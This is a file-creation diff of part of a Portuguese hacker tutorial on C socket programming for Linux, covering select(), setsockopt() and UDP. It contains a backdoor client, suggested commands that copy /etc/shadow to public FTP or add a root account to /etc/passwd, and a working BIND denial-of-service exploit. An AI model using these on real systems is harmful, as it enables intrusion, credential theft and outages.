@@ -1,0 +1,3655 @@
+########################################################################
+########################## UNSEKURITY TEAM #############################
+########################################################################
+
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+Thanks Unsekurity Team.
+nashleon@yahoo.com.br
+
+Este e outros textos interessantes podem ser obtidos em:
+http://unsekurity.virtualave.net/  -> Home page do Unsekurity Team.
+
+
+OBS: Nao nos responsabilizamos pelo mau uso das informacoes aqui contidas.
+     Todo material e exemplos descritos nesse tutorial possuem somente
+     propositos educacionais.
+
+
+DEDICATORIA: Dedico este tutorial a todos aqueles que levam o hacking a
+	     serio, que se sacrificam em divulgar informacoes, a todos os
+	     que sao prejudicados e perseguidos por defenderem estes
+             ideais, a todos que amam o hacking acima do dinheiro, que
+	     se entristecem com a desgraca alheia, e que lutam para
+	     fazerem um mundo melhor sem prejudicarem terceiros.A todos
+	     voces que se incluem nisso, um muito obrigado!
+	     
+
+Estamos de volta novamente nessa jornada dificil,mas gratificante em busca
+de obter mais conhecimentos sobre tao fascinante assunto.Na primeira parte
+vimos coisas bem basicas de programacao de sockets em C para linux,
+pretendo dessa vez ir mais longe, escrevendo exemplos praticos um pouco
+mais complexos, mas nao dificeis.Agradeco desde jah aqueles que se deram
+ao trabalho de ler o tutorial antigo e que vem acompanhando as publicacoes
+do Unsekurity Team, espero que tudo isso sirva para esquentar a cena
+underground, background, foreground, como quiser!!:)
+A recepcao vem sendo muito boa, temos muito material de qualidade,
+ferramentas excelentes, pouco conhecidas, mas nao estamos aqui somente p/
+munir voce de municoes nao!!Queremos que voce aprenda por sih proprio,
+como fazer suas proprias ferramentas p/ alcancar seus alvos e objetivos.
+Sabemos que muita gente nao possui acesso a informacao, e muitos nao tem
+condicoes financeiras de conseguir bons livros ou material de nivel, eu
+sou um exemplo fiel disso tudo.Espero que em breve aumente o numero de
+textos sobre assuntos afins na internet, que mais e mais pessoas se
+engajem em ensinar e divulgar muitas teorias e praticas desse fascinante
+mundo.Eh lamentavel que ainda tenhamos muitas, mas muitas pessoas boas,
+desistindo de aprender sobre algo, porque nao tem quem os ensine ou
+material capaz de ensina-lo.
+Pretendo neste tutorial seguir o mesmo modo adotado pelo primeiro,
+descrevendo as teorias(sintaxes,dados,observacoes) seguidas de exemplos
+praticos voltados a atividade fucadora.
+Nesse tutorial iremos avancar um pouco mais nos conceitos da suite
+TCP/IP, irei descrever dados,teorias,observacoes basicas, sobre o
+protocolo conhecido como Internet(TCP/IP), bem como demonstrar na
+pratica, como se enviar pacotes contendo dados para alguns dos protocolos
+usados na Internet.Lembrando que isso eh soh o basico,mas que para o
+fucador eh essencial.
+
+
+
+		--------------------------------------
+	       | PROGRAMACAO DE SOCKETS EM C P/ LINUX |
+		----------- | (PARTE II) | -----------
+
+
+
+------------------------------- INDICE --------------------------------
+
+1. INTRODUCAO
+2. MAIS FUNCOES
+   2.1. A Funcao select()
+   2.2. A Funcao setsockopt()
+3. PROGRAMACAO BASICA DE SOCKETS UDP
+   3.1. O Protocolo UDP
+   3.2.1. Criando um Socket 
+   3.2.2. Criando as Estruturas
+   3.2.3. Envio e Recebimento de Dados 
+   3.2.3.1 - A funcao sendto()
+   3.2.3.2 - A funcao recvfrom()
+4. PROTOCOLOS DE REDE(MODELO TCP/IP)
+   4.1. IP
+   4.2. ICMP
+   4.3. ARP
+   4.4. TCP
+5. PROGRAMACAO BASICA DE SOCKETS RAW
+   5.1. Declarando o Socket 
+   5.2. Funcoes de Envio e Recebimento
+   5.3. Checksum
+   5.4. Estruturas Pre-definidas de Protocolos
+6. TEORIAS BASICAS INTRODUTORIAS DE ALGUMAS TECNICAS AVANCADAS
+   6.1 IP SPOOF
+   6.2 ARP POISONING
+   6.3 DNS SPOOF
+   6.4 TUNEIS
+   6.5 SNIFFERS
+   6.6 OUTRAS
+7. TERMINANDO
+   7.1 Links e Referencias
+   7.2 Consideracoes Finais.
+
+---------------
+1 - INTRODUCAO |
+---------------
+
+Veremos coisas basicas sobre programacao de sockets em C, de modo 
+que mais uma vez,este eh apenas um tutorial voltado para Newbies,avancando
+muito pouco em complexidade.Espero que os exemplos e a forma adotada para
+descrever os processos e a escrita em sih, seja da forma mais explicativa
+possivel, e que voce possa ter um bom aprendizado, nos itens que irei
+abordar.
+
+
+----------------- 
+2 - MAIS FUNCOES |
+-----------------
+
+No primeiro tutorial sobre sockets, descrevi basicamente algumas das
+funcoes mais usadas em programacao de Sockets em C, iremos agora ver
+mais algumas funcoes que sao muito usadas neste tipo de programacao.
+Gostaria antes de dizer, que Programacao de Sockets, derivam de 
+programacao em IPC ou de IPC(Interprocess Comunication), que sao
+intercomunicacao de Processos.Em breve devemos estar disponibilizando
+materiais sobre isso, visando uma maior automatizacao de algumas tecnicas
+fucadoras, fique de olho na home page do Unsekurity Team!
+
+
+2.1 A Funcao select()
+---------------------
+
+Esta funcao eh importantissima em processos daemons(algum servico remoto),
+e eh uma funcao que pode ser considerada complexa, pois existem inumeras
+possibilidades em seu uso.Irei aqui somente descrever de forma pratica e
+breve, o basico sobre esta funcao, visando o uso para atividades fucadoras.
+A funcao select() eh usada para sincronizar um processo de I/O (entrada e
+saida) de multiplexacao.O que seria isso na pratica? Voce possui um
+servidor que recebe muitos acessos, ao inves de voce ficar usando accept()
+seguido de muitos fork()'s,criando varios processos filhos, voce poderia
+usar select() que criaria somente um processo singular.Na pratica, isso
+resultaria em ganho de performance para o servidor.
+Se uma aplicacao eh usada por mais de um socket, o uso de select() eh
+uma boa pois deve ser usado para encontrar alguns arquivos que nao estao
+ativos.Para um fucador o uso de select() eh muito variado, voce pode se
+deparar com uma situacao onde um servico remoto bugado soh negocia pacotes
+com um outro servico remoto, aih nesse caso voce necessitarah criar um
+daemon, ou melhor dizendo, um pseudo-daemon para que voce possa explorar o
+furo.Como vimos, select() ajuda em processos gerados por daemons, isso
+pode ser muito util quando se necessita gerar um overflow na vitima.
+Outro uso comum de select() sao em backdoors e trojans horses que abrem
+uma determinada shell, ou executam um determinado comando, numa porta.
+Como vimos o uso de select() pode ser util no intuito de camuflar o maximo
+possivel a backdoor ou o trojan horse, isso serah descrito brevemente em
+outro tutorial, fique atento!
+
+A funcao select() trabalha bloqueando a aplicacao ateh que algo aconteca
+em um socket(file descriptor).Que algo eh este? Dados vindo ou sendo
+habilitados para escrever para um socket(file descriptor) -- voce chama
+select(), para que ela vigie a chegada dos dados para voce.
+Para chama-la voce enche uma estrutura fd_set com alguns macros.
+Estes macros muitas vezes jah estao pre-definidos, veremos quais sao:
+
+FD_CLR(int fd, fd_set *set);
+FD_ISSET(int fd, fd_set *set);
+FD_SET(int fd, fd_set *set);
+FD_ZERO(fd_set *set);
+
+Onde:
+
+FD_SET -> Irah adicionar um dado socket (descriptor) em um set.
+FD_CLR -> Irah remover um dado socket (descriptor) de um set.
+FD_ZERO -> Irah limpar um set.
+FD_ISSET -> Testa para ver se um socket (descriptor) eh parte de um set.
+
+Para podermos dar inicio ao "enchimento" dessa estrutura fd_set,
+vamos primeiro aprender como declara-la.Vejamos o esquema abaixo:
+
+#include <stdio.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int  main(void){
+
+fd_set rfds;
+....
+}
+
+Para declara-la necessitamos somente disto.Essa estrutura fd_set eh
+usada para mudar(setar) o status de um ou mais sockets(file descriptors).
+O que select() faz eh esperar por um determinado acontecimento num socket
+para que possa atraves de fd_set mudar ou setar o status do socket.
+Vejamos como select() eh declarada:
+
+#include <sys/time.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int  select(int  n,  fd_set  *readfds,  fd_set  *writefds,
+fd_set *exceptfds, struct timeval *timeout);
+
+
+Veremos com calma o que significa cada um desses argumentos:
+
+
+n -> Eh o socket alto-numerado em algum dos 3 sets(*readfds,*writefds,
+     *exceptfds) mais 1.
+
+*readfds -> Possui sockets(file descriptors) que serao vigiados para ver
+	    se os caracteres estao vindo disponiveis para leitura.
+
+*writefds -> Possui sockets que serao vigiados para ver se eles estao
+	     aptos para imediatamente escrever neles.
+
+*exceptfds -> Possui sockets que serao vigiados para excecoes.
+
+*timeout -> eh um tamanho acima do tempo esperado para select retornar.
+            Ele pode ser zero, fazendo com que select retorne 
+            imediatamente.Se timeout eh NULL(sem timeout), select pode
+            bloquear indefinidamente.
+
+Os possiveis valores de retorno para select() seguem explicados abaixo:
+
+Se sucesso, select retorna o numero de descriptors contido no descriptor
+setado, que pode ser zero, se o timeout expira antes de alguma coisa
+interessante acontecer.Em erro, -1 eh retornado, e errno eh setado
+apropriadamente; os sets e timeout veem indefinidos, entao nao confia em
+seu conteudo apos um erro.
+
+Possiveis respostas de erros:
+
+EBADF -> Um file descriptor invalido foi dado em um dos sets.
+
+EINTR -> Um sinal nao bloqueado foi recebido.
+
+EINVAL -> n eh negativo.
+
+ENOMEM -> Select nao pode alocar memoria para tabelas internas.
+
+
+OBS:
+
+Em linux, timeout eh modificado para refletir a descida do tempo nao
+dormido(slept); muitas outras aplicacoes nao fazem isto.Isto causa
+problemas quando codigos em linux que le timeout sao portados para
+outros sistemas operacionais, e quando o codigo eh portado para linux
+que re-usa uma struct timeval para multiplos selects em um loop sem
+reninicializa-los.Considere timeout para ser indefinido apos select 
+retornar.
+
+Vejamos um exemplo abaixo:
+
+#include <stdio.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+
+int  main()  {
+           
+fd_set rfds;
+struct timeval tempo;
+int retorno;
+
+
+FD_ZERO(&rfds);
+FD_SET(0, &rfds);
+
+/* Espera por 5 segundos */
+     
+tempo.tv_sec = 5;
+tempo.tv_usec = 0;
+
+/* Vemos abaixo que n = 1; *readfds = &rfds; *writefds e *exceptfds sao
+   iguais a NULL, e *timeout aponta para a estrutura tempo definida acima */
+
+retorno = select(1, &rfds, NULL, NULL, &tempo);
+
+if (retorno){
+printf("Dados estao disponiveis agora.\n");
+/* FD_ISSET(0, &rfds) serah verdadeiro */
+}
+else{
+printf("Sem dados disponiveis em 5 segundos.\n");
+}
+exit(0);
+}
+
+
+Se voce compilar deverah ter como resposta:"Sem dados disponiveis em 5
+segundos".
+
+Vemos aih em cima o uso de select() com sincronizacao de tempo pela
+struct timeval, que eh declarada em sys/times.h.Voce pode usar varios
+metodos para sincronizar tempo e usar em conjunto com select(), veja
+o que eh mais pratico para voce.Geralmente se usa este que foi descrito
+acima.
+
+Vejamos no programa abaixo um uso basico para a funcao select():
+
+--------------------------- vapt_vupt.c ---------------------------------
+/* PROGRAMA PARA DEMONSTRAR O USO DE SELECT.
+   DESENVOLVIDO POR NASH LEON VULGO CORACAODELEAO.
+   nashleon@yahoo.com.br
+   THANKS UNSEKURITY TEAM.
+   http://unsekurity.virtualave.net/
+ */
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <sys/time.h>
+
+#define  PORTA    20000
+
+int vapt_vupt(int Meusocket);
+
+int main(int argc, char *argv[])
+{
+   int Meusocket,porta;
+   char *alvo;
+   struct hostent *he;
+   struct sockaddr_in vitima;
+
+if(argc < 2){
+   printf("Programa cliente vapt_vupt para backdoor!!!\n");
+   printf("Desenvolvido por Nash Leon e Unsekurity Team!!\n");
+   printf("Uso: %s <vitima> <porta>\n\n",argv[0]);
+   exit(0);
+}
+if(argc == 2){
+   alvo = argv[1];
+   porta = PORTA;
+}
+if(argc > 2){
+   alvo = argv[1];
+   porta = atoi(argv[2]);
+}
+he = gethostbyname(alvo);
+if(he == NULL){
+fprintf(stderr,"Host Deconhecido mano!!\n");
+exit(1);
+}
+
+vitima.sin_family = he->h_addrtype;
+vitima.sin_port = htons(porta);
+vitima.sin_addr = *((struct in_addr *)he->h_addr);
+bzero(&(vitima.sin_zero), 8);
+
+Meusocket = socket(AF_INET,SOCK_STREAM,0);
+if(Meusocket < 1){
+   printf("Erro no socket mano!!\n");
+   exit(1);
+    }
+if(connect(Meusocket,(struct sockaddr * )&vitima, sizeof(vitima)) < 0){
+printf("Erro em connect() mano!!\n");
+close(Meusocket);
+exit(0);
+}
+vapt_vupt(Meusocket);
+return 0;
+}
+
+/* Aqui na funcao abaixo comeca o uso de select() */
+/* Definimos uma funcao maximo() para manipular o tamanho maximo
+   do file descriptor(Socket) que manipularemos. */
+
+#define maximo(x,y) ((x)>(y)?(x):(y))
+
+int vapt_vupt(int Meusocket)
+{
+  char envia[1224], recebe[1224];
+  fd_set rset;
+  int maxfd, n;
+
+  sleep(1);
+  printf("Entrando na backdoor\n");
+
+  /* Colocamos os comandos que queremos executar em "envia" */
+
+  strcpy(envia, "cd /; uname -a; pwd; id; exit;\n");
+
+  /* Escrevemos no socket */
+
+  write(Meusocket, envia, strlen(envia));
+
+  /* Aqui comeca um looping infinito(para recebimento e envio de dados) */
+  
+  for (;;)
+  {
+  
+/* Adicionamos os decriptores para o set */
+
+    FD_SET(fileno(stdin), &rset);
+    FD_SET(Meusocket, &rset);
+    maxfd = maximo(fileno(stdin),Meusocket) + 1;
+
+/* Aqui usamos select(), com maxfd como o socket alto-numerado em
+   *readfds(&rset) */
+
+    select(maxfd, &rset, NULL, NULL, NULL);
+
+/* Testamos para ver se fileno(stdin)(descriptor) eh parte de &rset(set)*/
+
+    if (FD_ISSET(fileno(stdin), &rset))
+    {
+      bzero(envia, sizeof(envia));
+      fgets(envia, sizeof(envia) - 2, stdin);
+      write(Meusocket, envia, strlen(envia));
+    }
+
+/* Testamos para ver se Meusocket(descriptor) eh parte de &rset(set) */
+
+    if (FD_ISSET(Meusocket, &rset))
+    {
+      bzero(recebe, sizeof(recebe));
+      if ((n = read(Meusocket, recebe, sizeof(recebe))) == 0)
+                        exit(0);
+       if (n < 0)
+      {
+        return -1;
+      }
+      fputs(recebe, stdout);
+    }
+  }
+}
+-------------------------------------------------------------------------
+
+Vimos acima o uso basico de select() na ajuda e automatizacao no envio
+de dados por um socket.Voce pode usar esse programa para se conectar a
+backdoor descrita no primeiro tutorial sobre sockets que fiz.Qual um
+possivel uso desse programa acima? Existem algumas situacoes, e voce pode
+se deparar com alguma delas, o tempo sempre foi nosso inimigo, as vezes
+nao eh muito bom ficar horas ou mesmo minutos em uma rede brincando de
+seja lah o que for, o que esse programa faz eh agilizar as coisas, a
+backdoor jah estah lah entao ele somente faz eh executar alguns comando
+no intuito de nao perder muito tempo(um possivel comando que voce poderia
+colocar alih poderia ser "cp /etc/shadow /home/ftp/pub; chmod 0755
+/home/ftp/pub/shadow;exit;" ou mesmo "echo hack0::0:0::/:/bin/sh >>
+/etc/passwd;exit;", use sua imaginacao), lembrando que este programa
+possui apenas propositos educacionais.
+
+As possibilidades de uso de select() sao inumeras, irei aborda-las mais
+detalhadamente numa futura continuacao desse tutorial,por enquanto se
+atenha a esses exemplos(mais abaixo possui mais exemplos) e caso necessite 
+de uma olhada nos links que disponibilizo no final desse txt.
+
+
+2.2. A Funcao setsockopt()
+---------------------------
+
+Assim como select(), esta funcao possui mil e uma utilidades, eh um
+verdadeiro canivete suico.Irei aborda-la muito superficialmente, em
+breve devo disponibilizar mais material sobre isso.
+O uso dessa funcao eh bastante comum em raw socks.Em linux existem
+alguns empecilhos, alguns argumentos(Ex: IP_HDRINCL) podem nao serem 
+validos caso esteja usando uma kernel antiga.
+Essa funcao eh usada para setar opcoes num socket.Veremos mais abaixo que
+opcoes disponiveis sao essas,mas vejamos agora como se declara essa funcao.
+
+/* Os headers necessarios, consulte man page */
+
+#include <sys/types.h>
+#include <sys/socket.h>
+
+int setsockopt(int Meusocket, int nivel, int optname,  const  void
+               *optval, socklen_t optlen);
+
+Onde:
+
+Meusocket -> Nosso arquivo socket.
+
+nivel -> Nivel eh usado para manipular opcoes no nivel socket.Geralmente
+	 eh especificado como SOL_SOCKET.
+	 Para manipular opcoes para outro nivel, o numero do
+	 protocolo da opcao de controle do protocolo apropriado eh
+         provido.
+	 Por exemplo, para indicar que uma opcao eh para ser interpretada
+	 pelo protocolo TCP, nivel deve estar setado para o numero do
+	 protocolo TCP, que eh 6.Voce pode ver uma pequena lista com alguns
+	 numeros de protocolo em /etc/protocols.
+
+optname -> Optname sao as opcoes propriamente ditas que serao setadas para
+	   o nosso arquivo socket.Elas sao passadas para o modulo do
+	   protocolo apropriado para interpretacao.O header <sys/socket.h>
+	   contem as definicoes para as opcoes de nivel socket.
+
+optval -> Muitas aplicacoes utilizam um "int" para optval.Para setsockopt,
+	  o parametro deve ser um int diferente de zero para habilitar uma
+	  opcao booleana, ou zero se uma opcao eh para ser disabilitada.
+	  As vezes tudo o que voce precisa fazer eh como no esquema abaixo:
+          
+	  int i; /* Declara-se um inteiro */
+	  setsockopt(Meusocket,6, IP_HDRINCL, (char *)&i,sizeof(i));	
+
+	
+optlen -> Eh o tamanho usado para acessar os valores das opcoes.Vemos
+	  um exemplo em "sizeof(i)" descrito acima.
+
+
+Veremos abaixo algumas das opcoes(optname) aceitas para o nivel socket:
+
++ SO_DEBUG -> Habilita gravacao de informacao debugada.
+
++ SO_REUSEADDR -> Habilita reusar endereco local.
+
++ SO_KEEPALIVE -> Habilita guardar conexoes ativas.
+
++ SO_LINGER -> Demora a fechar se dados estao presentes ou atuais.
+
++ SO_BROADCAST -> Permite enviar mensagem broadcast.Requer permissao para
+		  envio de datagramas broadcast no socket.
+
++ SO_SNDBUF -> Seta tamanho do buffer para saida.
+
++ SO_RCVBUF -> Seta tamanho do buffer para entrada.
+
++ SO_SNDLOWAT -> Seta conta minima para saida.
+
++ SO_RCVLOWAT -> Seta conta minima para entrada.
+
++ SO_SNDTIMEO -> Pega valor de timeout para saida.
+
++ SO_RCVTIMEO -> Pega valor de timeout para entrada.
+
++ SO_TYPE -> Pega o tipo de socket.
+
++ SO_ERROR -> Pega e limpa erro num socket.
+
+Se voce quiser mais detalhes sobre essas opcoes, consulte a man page da
+funcao setsockopt.
+
+Veremos abaixo um simples exploit DoS usando setsockopt.
+
+-------------------------------------------------------------------------
+/*
+ * "solinger" Denial Of Service - bind 8.1.*, 8.2, 8.2.1
+ * by Mixter <mixter@newyorkoffice.com> /members.tripod.com/mixtersecurity
+ * Alterado por Nash Leon vulgo coracaodeleao.
+ * nashleon@yahoo.com.br
+ *
+ * Impacto: Faz com que um servidor bind nas versoes acima citadas pare
+ * de responder as requisicoes por 120 segundos(2 minutos),isto eh,
+ * soh serve para ser usado por propositos educacionais ou de Denial
+ * of Service.
+ *
+ * Aja com bom senso.Denial of Services somente em ultimo caso,evite
+ * isso ateh mesmo em buffer overflows remotos, pois muita gente pode
+ * sair perdendo com isso, inclusive voce.(Nash Leon)
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <signal.h>
+#include <errno.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+#define DNS     53
+#define REVER   10
+
+int main(int argc, char **argv)
+{
+  struct linger l1ng3r;
+  int Meusocket, conector, i;
+  struct sockaddr_in vitima;
+
+if (argc != 2){
+printf("Simples DoS para bind versoes 8.1.*, 8.2 e 8.2.1.\n");
+printf("Desenvolvido por mixter e alterado por Nash Leon.\n");
+printf ("uso: %s <ip_do_dns>\n", argv[0]);
+exit (0);
+}
+printf ("unbind - SO_LINGER bind DoS (c) Mixter\n");
+printf ("enviando p/ %s: \n", argv[1]);
+fflush (0);
+for (i = 0; i < REVER; i++)
+{
+Meusocket = socket (AF_INET, SOCK_STREAM, 0);
+
+l1ng3r.l_onoff = 1; /* Veja explicacao abaixo */
+
+/* Aqui estah setsockopt() */
+
+if(setsockopt(Meusocket,SOL_SOCKET,SO_LINGER,(void *)&l1ng3r,sizeof(l1ng3r)) < 0)
+{
+perror ("setsockopt");
+exit (0);
+}
+vitima.sin_family = AF_INET;
+vitima.sin_port = htons (DNS);
+vitima.sin_addr.s_addr = inet_addr (argv[1]);
+if (vitima.sin_addr.s_addr == -1)
+{
+printf ("invalido ip: '%s' !\n", argv[1]);
+exit (0);
+}
+bzero (&vitima.sin_zero, 8);
+conector = connect(Meusocket,(struct sockaddr *)&vitima,sizeof(struct sockaddr));
+if (conector == 0)
+    printf (".");
+close (Meusocket);
+    fflush (0);
+}
+printf ("Pronto!Nao deve responder por 2 minutos!\n");
+return 0;
+}
+--------------------------------------------------------------------------
+
+Teste este programa em sua rede local, voce verah o envio de dados via
+connect(), mas com setsockopt setando opcoes no arquivo socket.Esta eh
+uma forma simples de vermos como se usa setsockopt(), na parte de Raw
+Sockets veremos mais exemplos do uso desta funcao.
+No exemplo acima voce viu uma estrutura, "struct linger", esta estrutura
+eh definida em <linux/socket.h> da seguinte maneira:
+
+struct linger {
+                      int  l_onoff;   /* ativa Linger(demora)  */
+                      int  l_linger;  /* quanto tempo demorar(linger) */
+              };
+
+l_onoff indica ativacao de linger(demora) ou nao.Se ele eh setado para 1
+l_linger contem o tempo em centenas de segundos quanto tempo o processo deve
+demorar para completar o fechamento.Se l_onoff eh setado para zero o
+processo retorna imediatamente.
+
+
+-------------------------------------
+3. PROGRAMACAO BASICA DE SOCKETS UDP |
+-------------------------------------
+
+No Tutorial passado vimos quase nada sobre Programacao de Sockets para
+UDP, veremos agora de forma objetiva, um pouco sobre este tipo de
+Socket(UDP Socks), bem como teorias sobre o protocolo UDP.
+
+3.1 - O Protocolo UDP
+--------------------
+
+Para transportar uma mensagem de uma estacao para outra, o protocolo
+UDP(User Datagram Protocol) utiliza o IP(Internet Protocol) e prove
+o mesmo nivel de confiabilidade deste ultimo(Veja secao sobre protocolo
+IP mais abaixo), pois eh tambem um protocolo nao-oritentado a conexao.
+Isso significa que o UDP nao utiliza mecanismos de reconhecimento para
+assegurar que as mensagens transmitidas cheguem ao seu destino, nao ordena
+as mensagens que chegam e nao prove meios para controlar a taxa com que as
+informacoes fluem entre as maquinas.Assim, pode-se perder, duplicar ou
+receber dados fora da ordem.Isto implica que uma aplicacao que utiliza o
+UDP deve, de alguma maneira, tratar esse problema de falta de
+confiabilidade na transferencia de dados.Aih que entra o papel do bom
+programador de Sockets em UDP.Mas nao se angustie, ninguem nasce sabendo
+tudo, com calma, chegaremos lah.
+No modelo em camadas da Arquitetura Internet,o UDP estah situado na
+camada acima do IP.Conceitualmente, as aplicacoes acessam o UDP, que
+utiliza o IP para enviar e receber datagramas, como mostra o
+esquema abaixo:
+
+
+
+			 ------------------------
+			|       Aplicacoes       |
+			 ------------------------
+			|          UDP	 	 |
+			 ------------------------
+ 			|           IP		 |
+			 ------------------------
+			| Sub Rede de Comunicacao|
+			 ------------------------
+
+
+O UDP prove os mecanismos simples que os processos nas estacoes(hosts)
+podem usar para enviar mensagens a processos residentes em outras
+estacoes. Tais processos utilizam portas de servico UDP que os 
+identificam dentro de uma estacao, este metodo eh parecido com o
+utilizado pelo TCP.Cada mensagem UDP contem tanto a porta destino quanto
+a porta de origem, tornando possivel ao UDP no destino entregar a 
+mensagem ao processo correto e a este processo receptor encaminhar uma
+resposta ao processo emissor da mensagem.Cada estacao contem uma serie de
+portas de servicos identificadas por numeros inteiros positivos(parecidas
+com as portas usadas no TCP).O sistema operacional local prove um
+mecanismo de interface que os processos utilizam para especificar uma 
+porta ou acessa-la.Muitos sistemas operacionais proveem acesso sincrono, 
+o processamento fica suspenso durante uma operacao de acesso a uma porta. 
+
+OBS: Vou dar uma breve explicacao sobre tipos de transmissao, o pessoal
+     que acessava BBS e VideoTextos deve saber bem o que vou descrever
+     abaixo, mas de toda forma, isso servirah para alguem que nao tem
+     conhecimentos profundos em Telecomunicacoes.Vejamos:
+
+     *  Modo Assincrono - A transmissao assincrona caracteriza-se por
+        enviar individualmente cada caracter.O controle da transmissao
+	eh feito atraves de um bit que avisa que eh o inicio de um
+	caracter(start bit) e outro que avisa que eh o seu fim(stop bit).
+ 	A transmissao assincrona nao possui qualquer limitacao de tempo
+	ou quantidade de caracteres.E eh um modo seguro, embora nao seja
+	muito rapido(os bits do inicio e fim ocupam muito espaco), para
+	transmitir dados.
+
+     *  Modo Sincrono - Na transmissao Sincrona, tudo pode ser mais
+	rapido. Os bits sao enviados em blocos, centenas de cada vez e 
+	nao se perde tempo,nem espaco, com bits de controle no inicio e
+	fim de cada caracter.O controle eh efetuado apenas a nivel de
+	bloco.Um caracter inicial marca seu inicio, e outro marca seu fim.
+	Aqui o tempo tem muita importancia. Eh que os bits e caracteres
+	dentro do bloco, como nao possuem identificacao de inicio e fim,
+	sao reconhecidos pelo tempo de duracao da sua transmissao.Para
+	isso, eh claro, eh necessario que os relogios dos equipamentos
+	estejam perfeitamente sincronizados.Afinal, milhares de caracteres
+	sao enviados a cada segundo.
+
+
+Vimos aih em cima o basico sobre estes dois tipos de trasmissao, lembrando
+que descrevi isso daih apenas para que voce tenha uma ideia.Os protocolos
+tendem a variar a definicao do que escrevi acima, digo isso porque essa
+definicao eu encontrei nao para protocolo Internet(TCP/IP), e sim para
+outros tipos, como ZMODEM, XMODEM, KERMIT e etc..coisas bem antigas e
+creio que ultrapassadas com a chegada do OSI.Tenha em mente somente as
+definicoes, do que sao esses tipos de tranmissao.Mas continuando.
+
+O UDP prove meios de multiplexacao e demultiplexacao na transmissao e
+recepcao de datagramas de ou para varios processos residentes em uma
+mesma estacao(host).Aceita datagramas entregues por varios processos
+e passa-os ao IP para transmissao, da mesma maneira que recebe
+datagramas do IP, repassando-os aos processos de aplicacao apropriados.
+Conceitualmente, a multiplexacao/demultiplexacao entre o UDP e os
+processos eh implementada atraves da utilizacao de portas.Cada processo
+deve negociar com o sistema operacional a obtencao de uma porta de
+protocolo antes que possa enviar um datagrama UDP.Feito isto, tal
+processo envia atraves desta porta qualquer datagrama, incluindo no
+campo da porta de origem o numero da porta utiizada.Por outro lado,
+quando recebe datagramas do IP, o UDP realiza a demultiplexacao
+baseando-se no numero da porta de destino especificada em cada datagrama.
+Cada mensagem UDP eh chamada de datagrama do usuario(user datagram) e
+consistem em duas partes: um cabecalho e uma area de dados.Veja o
+esquema de um datagrama abaixo:
+
+
+ 0			     16				     31
+ --------------------------------------------------------------
+|      porta de origem        |	       porta de destino        |
+ --------------------------------------------------------------
+|   tamanho da mensagem       |            checksum	       |
+ --------------------------------------------------------------
+|			    dados			       |
+ --------------------------------------------------------------
+|		...........................		       |
+ --------------------------------------------------------------
+
+Onde:
+
++ porta de origem -> Identifica o numero da porta UDP de origem.
+		     Este campo eh opcional.
+
++ porta de destino -> Identifica o numero da porta UDP de destino.
+
++ tamanho da mensagem -> Eh o tamanho que contem o numero total de
+			 octetos do datagrama UDP, incluindo o cabecalho
+			 e os dados do usuario.Assim, o valor minimo para
+			 este campo eh oito, que corresponde ao tamanho
+			 do cabecalho(64 bits).
+
++ checksum -> Este campo eh opcional, mas para nossos intuitos eh muito
+	      importante.Um valor zero neste campo indica que ele nao
+	      deve ser tratado.Contudo, deve-se lembrar que, no caso do
+	      IP, o checksum eh calculado apenas sobre o cabecalho do IP,
+	      e, se nao for utilizado o checksum do UDP, nenhuma 
+	      verificacao eh realizada sobre os dados do usuario.
+
+Antes de calcular o checksum, o UDP adiciona um pseudo-cabecalho ao
+datagrama original e calcula o checksum sobre o datagrama inteiro.Este
+pseudo-cabecalho nao eh transmitido com o datagrama UDP nem eh incluido
+no seu tamanho.O pseudo-cabecalho utilizado no calculo do checksum UDP
+consiste em 12 octetos de dados arranjados, conforme o esquema abaixo:
+
+
+
+ 0			      16			     31 
+ --------------------------------------------------------------
+|                    endereco IP de origem                     |
+ --------------------------------------------------------------
+|                    endereco IP de destino                    |
+ --------------------------------------------------------------
+|   zero     |   Protocolo    |       Tamanho do UDP	       |
+ --------------------------------------------------------------
+
+Onde:
+
++ endereco IP de origem -> Contem o endereco de origem que sao utilizados
+			   quando a emissao de um datagrama UDP.
+
++ endereco IP de destino -> Contem o endereco de destino.
+
++ zero -> Esse campo tem a funcao de "padding" (enchimento), garantindo que 
+          o tamanho pseudo-cabecalho seja multiplo de 16 bits.
+
++ protocolo -> Contem o codigo de tipo de protocolo usuario do 
+	       IP(17 para UDP).
+
++ tamanho do UDP -> Contem o tamanho do datagrama UDP(sem incluir o pseudo-
+		    cabecalho).
+
+
+Para analisar o checksum, o receptor deve extrair estes campos do
+cabecalho IP, agrupa-los no formato do pseudo-cabecalho e calcular o checksum.
+Se for detectado erro o datagrama recebido eh descartado.
+
+O proposito de utilizar um pseudo-cabecalho eh verificar se o datagrama
+UDP alcancou seu destino correto. O cabecalho UDP em sih especifica
+somente o numero da porta de protocolo.Assim, para verificar o destino,
+o UDP no lado do emissor, calcula o checksum que inclui os enderecos IP
+de origem e de destino bem como o datagrama UDP.No sistema destino, o UDP
+verifica o checksum utilizando os enderecos IP obtidos do cabecalho do
+datagrama IP que carrega a mensagem UDP. Se o checksum estiver correto,
+muito provavelmente o datagrama alcancou a estacao de destino correta,
+bem como a porta de servico correta dentro daquela estacao.
+
+Vejamos abaixo, um esquema de um datagrama UDP completo, incluindo o
+cabecalho e dados, encapsulado em um datagrama IP:
+
+
+				--------------------------------------
+			       | Cabecalho UDP | Area de dados do UDP |
+				--------------------------------------
+			       .               .                      .
+			       .               .                      .
+		------------------------------------------------------
+	       | Cabecalho IP  |       Area de dados do IP            |
+		------------------------------------------------------
+	       .	       .       				      .
+	       .               .
+ ---------------------------------------------------------------------
+| Cabecalho do |	  Area de dados do Usuario		      |
+|    Quadro    |						      |
+ ---------------------------------------------------------------------
+
+
+Como podemos ver, a camada IP somente eh responsavel por transferir dados
+entre um par de estacoes em uma rede internet, enquanto a camada UDP
+somente eh responsavel por diferenciar entre multiplas fontes ou
+destinacoes dentro de uma estacao.Desse modo, o cabecalho IP identifica as
+estacoes de origem e destino; e o cabecalho UDP identifica as portas de
